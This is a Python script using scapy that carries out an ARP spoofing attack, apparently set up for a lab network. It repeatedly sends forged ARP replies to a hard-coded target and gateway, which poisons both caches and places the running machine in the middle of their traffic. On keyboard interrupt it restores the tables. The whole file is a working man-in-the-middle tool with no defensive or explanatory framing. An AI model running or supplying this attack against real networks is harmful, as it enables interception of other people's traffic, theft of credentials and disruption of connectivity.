#!/usr/bin/env python

import sys
import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    return scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0][0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=get_mac(dst_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    scapy.send(packet, verbose=False, count=4)


sent_packets_count = 0
target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("\n[+] Keyboard interruption detected. Quitting.")
